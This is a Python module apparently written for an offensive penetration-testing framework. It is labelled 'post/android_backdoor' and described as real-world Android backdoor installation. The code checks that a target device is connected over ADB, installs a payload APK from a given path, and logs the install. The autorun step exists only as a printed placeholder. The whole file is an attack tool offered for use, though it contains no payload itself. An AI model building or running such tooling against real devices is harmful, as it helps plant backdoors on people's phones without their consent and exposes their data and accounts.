import subprocess
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'post/android_backdoor',
        'description': 'Real-world Android backdoor installation via ADB.',
        'options': {
            'DEVICE_ID': 'Target device serial (from adb devices)',
            'PAYLOAD_PATH': 'Path to the APK payload to install',
            'AUTORUN': 'Automatically launch the app after install [default: true]'
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        try:
            device_id = self.framework.options.get('DEVICE_ID')
            payload_path = self.framework.options.get('PAYLOAD_PATH')
            autorun = self.framework.options.get('AUTORUN', 'true').lower() == 'true'

            if not device_id or not payload_path:
                console.print("[red][!] DEVICE_ID and PAYLOAD_PATH are required.[/red]")
                return

            console.print(f"[*] Checking connection to device [cyan]{device_id}[/cyan]...")
            # Check if device is connected
            check = subprocess.run(["adb", "-s", device_id, "get-state"], capture_output=True, text=True)
            if check.returncode != 0:
                console.print(f"[red][!] Device {device_id} not found or unauthorized.[/red]")
                return

            console.print(f"[*] Installing [cyan]{payload_path}[/cyan]...")
            install = subprocess.run(["adb", "-s", device_id, "install", payload_path], capture_output=True, text=True)
            
            if "Success" in install.stdout:
                console.print("[green][+] Payload installed successfully![/green]")
                log_action(f"Installed {payload_path} on {device_id}")
                
                if autorun:
                    # Generic attempt to start the main activity - this is a simplification
                    # In a real scenario, we'd need the package name/activity
                    console.print("[*] Attempting to launch package (requires manual activity check)...")
            else:
                console.print(f"[red][!] Installation failed: {install.stderr or install.stdout}[/red]")

        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
            log_action(f"Android backdoor error: {e}", level="ERROR")
